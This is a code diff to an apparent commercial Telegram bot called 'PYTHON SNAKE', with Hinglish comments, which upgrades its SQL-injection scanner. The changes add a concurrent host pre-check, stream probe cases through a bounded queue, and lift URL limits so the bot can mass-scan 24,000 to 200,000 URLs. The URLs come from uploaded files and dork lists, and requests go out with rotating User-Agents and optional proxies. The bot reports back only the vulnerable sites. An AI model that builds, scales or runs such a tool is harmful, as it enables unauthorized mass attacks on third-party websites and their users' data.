@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.16.0"
-BUILD = "direct-tools"   # feature flags — /ping me dikhte hain
+VERSION = "v2.17.0"
+BUILD = "big-lists"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -3223,77 +3223,111 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
           "req_ok": 0, "req_fail": 0, "stage": "precheck"}
 
     # ── PRE-CHECK: har host ek baar ping (dead host = 8 probes × timeout waste) ──
+    #  v2.17.0: pehle ye block chup-chaap minutes tak chalta tha (0/2000 dikhta tha)
+    #  aur STOP kaam nahi karta tha — har host ke liye naya session banta tha. Ab:
+    #   • ek hi session (phone pe halka, tez)
+    #   • live progress: hosts_done / hosts
+    #   • STOP turant kaam karta hai
+    #   • time cap (inj_precheck, default 45s) — jo host check nahi hua use ZINDA
+    #     maan liya jata hai, URL kabhi nahi girta
     _pre_t = time.time()
+    st["hosts_done"] = 0
+    st["hosts_total"] = len(urls)
+    st["precheck_capped"] = 0
+    try:
+        _pre_cap = max(0.0, float(sget("inj_precheck", 45) or 0))
+    except Exception:
+        _pre_cap = 45.0
     if len(urls) >= 40:
         _by_host = {}
         for _u in urls:
             _by_host.setdefault(urlparse(_u).hostname or "", []).append(_u)
         st["hosts"] = len(_by_host)
         _dead = set()
+        _checked = set()
         if len(_by_host) >= 3:
             _pc = mk_connector(limit=64, force_close=True)
+            _sem_pre = asyncio.Semaphore(48)
+            _pre_deadline = (time.time() + _pre_cap) if _pre_cap else 0
+            _last_pre = [0.0]
+            _cut = [0]
 
-            async def _ping_host(_h, _sample):
+            async def _ping_one(sess, _h, _sample):
                 if not _h:
                     return
-                try:
-                    async with aiohttp.ClientSession(connector=_pc) as _s0:
-                        async with _s0.get(
-                                _sample, headers=dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
-                                timeout=aiohttp.ClientTimeout(total=min(5.0, max(3.0, float(timeout)))),
+                async with _sem_pre:
+                    if (uid and stop_requested(uid)) or \
+                       (_pre_deadline and time.time() > _pre_deadline):
+                        _cut[0] = 1
+                        return
+                    try:
+                        async with sess.get(
+                                _sample,
+                                headers=dict(UA, **{"User-Agent": random.choice(UA_LIST)}),
+                                timeout=aiohttp.ClientTimeout(
+                                    total=min(4.0, max(2.0, float(timeout)))),
                                 ssl=False, allow_redirects=False) as _r0:
                             _ = _r0.status            # koi bhi status = host zinda
-                except Exception:
-                    _dead.add(_h)
-
-            _sem_pre = asyncio.Semaphore(48)
-
-            async def _ping_wrap(_h, _sample):
-                async with _sem_pre:
-                    await _ping_host(_h, _sample)
+                    except Exception:
+                        _dead.add(_h)
+                    finally:
+                        _checked.add(_h)
+                        st["hosts_done"] = len(_checked)
+                        if progress and time.time() - _last_pre[0] > 1.5:
+                            _last_pre[0] = time.time()
+                            st["stage"] = "precheck"
+                            try:
+                                await progress(st)
+                            except Exception:
+                                pass
 
             try:
-                await asyncio.gather(*[_ping_wrap(h, v[0]) for h, v in
-                                       list(_by_host.items())[:3000]])
+                async with aiohttp.ClientSession(connector=_pc) as _s0:
+                    await asyncio.gather(*[_ping_one(_s0, h, v[0])
+                                           for h, v in list(_by_host.items())])
             except Exception:
                 pass
             if _dead:
                 urls = [u for u in urls if (urlparse(u).hostname or "") not in _dead]
                 st["dead_hosts"] = sorted(_dead)[:200]
+            if _pre_deadline and time.time() > _pre_deadline:
+                st["precheck_capped"] = 1
+                logger.info("inj: precheck cap %.0fs — %d/%d hosts check hue, "
+                            "baaki zinda maane gaye", _pre_cap, len(_checked),
+                            len(_by_host))
         st["hosts_dead"] = len(_dead)
         st["hosts_live"] = max(0, st["hosts"] - len(_dead))
         st["urls"] = len(urls)
     st["precheck"] = round(time.time() - _pre_t, 1)
     st["stage"] = "scan"
+    if uid and stop_requested(uid):
+        st["stopped"] = 1
+        st["took"] = time.time() - st["start"]
+        return st
+    st["stage"] = "scan"
     if not urls:
         st["took"] = time.time() - st["start"]
         return st
 
-    tasks = []                      # (raw, url, family, payload, param)
+    # ── TASK PLAN (v2.17.0) ────────────────────────────────────────────
+    #  Pehle saare cases ek list me bante the: 24,552 URLs × 16 = ~4 lakh
+    #  tuples → phone ki memory khatam. Ab plan sirf COUNT rakhta hai aur
+    #  feeder stream karta hai (bounded queue).
     pending = {}
+    plan = []                       # (raw, params, planned_cases)
     for raw in urls:
         try:
             params = (url_reverse(raw).get("params") or [])[:2] or ["id"]
         except Exception:
             params = ["id"]
-        cases = []
-        for pn in params:
-            for fam, pl in probes:
-                u = inj_build_case(raw, pn, pl)
-                if u:
-                    cases.append((u, fam, pl, pn))
-                if len(cases) >= per_url:
-                    break
-            if len(cases) >= per_url:
-                break
-        if not cases:
+        n = min(int(per_url), max(1, len(params)) * max(1, len(probes)))
+        if n <= 0:
             continue
-        pending[raw] = len(cases)
-        st["total"] += len(cases)
-        for (u, fam, pl, pn) in cases:
-            tasks.append((raw, u, fam, pl, pn))
+        pending[raw] = n
+        st["total"] += n
+        plan.append((raw, params, n))
 
-    if not tasks:
+    if not plan:
         st["took"] = 0.0
         return st
 
@@ -3303,9 +3337,8 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
     st["proxy_on"] = bool(rot.enabled and len(rot))
     workers = max(4, min(64, int(conc or 40)))
     st["workers"] = workers
-    q = asyncio.Queue()
-    for t in tasks:
-        q.put_nowait(t)
+
+    q = asyncio.Queue(maxsize=max(1000, workers * 40))
     lock = asyncio.Lock()
     seen = set()
     dead_hosts = set()
@@ -3431,20 +3464,48 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                                             "status": status, "confirmed": True})
                 await _finish(raw)
 
+    async def feeder():
+        """Plan ko dheere-dheere queue me daalo (memory safe) + sentinel."""
+        try:
+            for raw, params, planned in plan:
+                if uid and stop_requested(uid):
+                    break
+                made = 0
+                for pn in params:
+                    for fam, pl in probes:
+                        if made >= planned:
+                            break
+                        u = inj_build_case(raw, pn, pl)
+                        if not u:
+                            continue
+                        await q.put((raw, u, fam, pl, pn))
+                        made += 1
+                    if made >= planned:
+                        break
+                if made < planned:            # build fail — counts balance karo
+                    async with lock:
+                        pending[raw] = pending.get(raw, 0) - (planned - made)
+                        if pending[raw] <= 0:
+                            st["urls_done"] += 1
+        finally:
+            for _ in range(workers):
+                await q.put(None)
+
     async def worker(session):
         while True:
             if uid and stop_requested(uid):
                 return
-            try:
-                raw, u, fam, pl, pn = q.get_nowait()
-            except asyncio.QueueEmpty:
+            item = await q.get()
+            if item is None:
+                await q.put(None)             # baaki workers ke liye bhi
                 return
+            raw, u, fam, pl, pn = item
             await one(session, raw, u, fam, pl, pn)
 
+    _done = [False]
+
     async def ticker():
-        while not q.empty():
-            if uid and stop_requested(uid):
-                return
+        while not _done[0]:
             await asyncio.sleep(1.6)
             if progress:
                 try:
@@ -3459,14 +3520,15 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
 
     async with aiohttp.ClientSession(connector=conn) as session:
         _tk = asyncio.create_task(ticker())
+        _fd = asyncio.create_task(feeder())
         try:
             await asyncio.gather(*[worker(session) for _ in range(workers)])
         finally:
+            _done[0] = True
+            if not _fd.done():
+                _fd.cancel()
             _tk.cancel()
-            try:
-                await asyncio.gather(_tk, return_exceptions=True)
-            except Exception:
-                pass
+            await asyncio.gather(_fd, _tk, return_exceptions=True)
     if uid and stop_requested(uid):
         st["stopped"] = 1
     st["took"] = time.time() - st["start"]
@@ -8370,6 +8432,7 @@ async def cb_inj_go(update, context):
            + B("Or send a file") + "\n" + P(".txt / .csv / .json / .xlsx — every URL inside")
            + "\n\n" + KV("Probes", "<code>%d</code> per parameter" % len(inj_probes_for(cat)), "🔍")
            + "\n" + KV("Max per URL", "<code>%s</code>" % fmt(int(sget("inj_targets", 24) or 24)), "🎯")
+           + "\n" + KV("URL limit", "<b>ALL</b> — koi cap nahi (24k bhi poore chalte hain)", "🌐")
            + "\n" + KV("Proxy", ("<b>OFF — direct</b> (fast + blocks nahi)"
                                   if not inj_proxy_on() else "<b>ON</b> (free proxies — slow)"), "🧅")
            + "\n\n" + P("Only vulnerable URLs come back — clean pages are dropped."))
@@ -8392,9 +8455,15 @@ async def cb_inj_last(update, context):
     await _run_inject(update, context, urls)
 
 
-def _urls_from_text(text: str, limit: int = 2000) -> list:
+URL_MAX = 200000                    # safety only — 24k / 100k sab chalega
+
+
+def _urls_from_text(text: str, limit: int = 0) -> list:
+    """Text se saare URLs — limit=0 matlab ALL (sirf safety cap)."""
     got = re.findall(r"https?://[^\s,'\"<>)\]]+", str(text or ""))
-    return _uniq(got)[:limit]
+    got = _uniq(got)
+    cap = limit if limit and limit > 0 else URL_MAX
+    return got[:cap]
 
 
 async def input_inj_urls(update, context, text: str):
@@ -8424,16 +8493,24 @@ def _inj_progress_card(st: dict, spin: int) -> str:
                   % (fmt(st.get("hosts_live", 0)), fmt(st.get("hosts", 0))))
     _stage = st.get("stage") or "scan"
     if _stage == "precheck":
+        _hd = int(st.get("hosts_done", 0) or 0)
+        _ht = int(st.get("hosts", 0) or 0)
+        _pp = (100.0 * _hd / _ht) if _ht else 0.0
         return (H("SCANNING", "%s • pre-check" % CAT_LABEL.get(st.get("cat"), "ALL"))
-                + "\n\n" + bar2(pct, 14, spin) + "\n\n"
-                + "◆ Sites      : <code>%s</code>\n" % fmt(st.get("urls", 0))
-                + "◆ Step       : <i>hosts check ho rahe hain (dead skip)</i>\n"
-                + "◆ Requests   : <code>0</code>")
+                + "\n\n" + bar2(_pp, 14, spin) + "\n\n"
+                + "◆ Sites      : <code>%s</code> URLs\n" % fmt(st.get("urls", 0))
+                + "◆ Hosts      : <code>%s / %s</code> <i>(checked)</i>\n"
+                  % (fmt(_hd), fmt(_ht) or "—")
+                + "◆ Step       : <i>dead sites hata rahe hain — phir probes shuru</i>\n"
+                + "◆ Requests   : <code>0</code>\n\n"
+                + "<i>⛔ STOP isi step me bhi turant kaam karta hai.</i>")
     return (H("SCANNING", "%s • %d probes" % (CAT_LABEL.get(st.get("cat"), "ALL"),
                                               len(inj_probes_for(st.get("cat") or "all"))))
             + "\n\n" + bar2(pct, 14, spin) + "\n\n"
             + "◆ Sites      : <code>%s/%s</code>  <i>(scanned)</i>\n"
               % (fmt(st["urls_done"]), fmt(st["urls"]))
+            + "◆ URLs in    : <code>%s</code>  <i>(dedupe ke baad)</i>\n"
+              % fmt(st.get("hosts_total") or st["urls"])
             + "◆ Requests   : <code>%s/%s</code>  <i>(probe calls)</i>\n"
               % (fmt(st["tested"]), fmt(st["total"]))
             + _extra
@@ -8511,7 +8588,9 @@ async def _run_inject(update, context, urls):
     urls = _uniq([u for u in urls if str(u).startswith("http")])
     msg = await reply_msg(update).reply_text(
         _inj_progress_card({"urls": len(urls), "urls_done": 0, "tested": 0, "total": 0,
-                            "vulns": [], "blocked": 0, "start": time.time(), "cat": cat}, 0),
+                            "vulns": [], "blocked": 0, "start": time.time(),
+                            "cat": cat, "stage": "precheck", "hosts": 0,
+                            "hosts_done": 0}, 0),
         parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
     spin = {"n": 0}
     last = {"t": 0.0}
@@ -8539,6 +8618,7 @@ async def _run_inject(update, context, urls):
         "🛡 <b>No vulnerabilities found</b>"
     body = (H("SQLi SCAN COMPLETE", "%.1fs" % took) + "\n\n"
             + head + "\n"
+            + "📥 URLs received: <code>%s</code>\n" % fmt(st.get("hosts_total") or st["urls"])
             + "🌐 URLs scanned: <code>%s</code> (clean <code>%s</code>)\n" % (fmt(st["urls_done"]), fmt(clean))
             + "🧪 Requests: <code>%s</code> · ⚡ <code>%.1f req/s</code>\n" % (fmt(st["tested"]), speed)
             + "🚫 Blocked: <code>%s</code>\n" % fmt(st["blocked"])
@@ -8550,6 +8630,8 @@ async def _run_inject(update, context, urls):
                if st.get("hosts_dead") else "")
             + ("⏱ Host pre-check: <code>%.1fs</code>\n" % st.get("precheck", 0)
                if st.get("precheck") else "")
+            + ("⚡ Pre-check cap hit — baaki hosts <i>zinda</i> maane gaye (koi URL nahi gira)\n"
+               if st.get("precheck_capped") else "")
             + ("⛔ Stopped early\n" if st.get("stopped") else "")
             + "\n" + bar2(100, 14, None))
     if vulns:
@@ -10897,7 +10979,7 @@ async def input_harvest_urls(update, context, text: str):
 #  📂 FILE UPLOAD — dork / URL / keyword .txt bhejo
 # ═══════════════════════════════════════════════════════════════════════════════
 FILE_MAX = 8 * 1024 * 1024          # 8 MB
-FILE_MAX_LINES = 20000
+FILE_MAX_LINES = 300000
 DORK_OP = re.compile(r"(inurl|intitle|intext|allinurl|allintitle|site|filetype|ext|"
                      r"inanchor|allintext)\s*:", re.I)
 
@@ -11648,8 +11730,8 @@ async def cb_file(update, context, action: str):
         return
 
     if action == "inj":
-        await _run_inject(update, context, [x for x in items if x.startswith("http")][:200]
-                          or items[:200])
+        _u = [x for x in items if str(x).startswith("http")] or list(items)
+        await _run_inject(update, context, _u[:URL_MAX])
         return
 
 
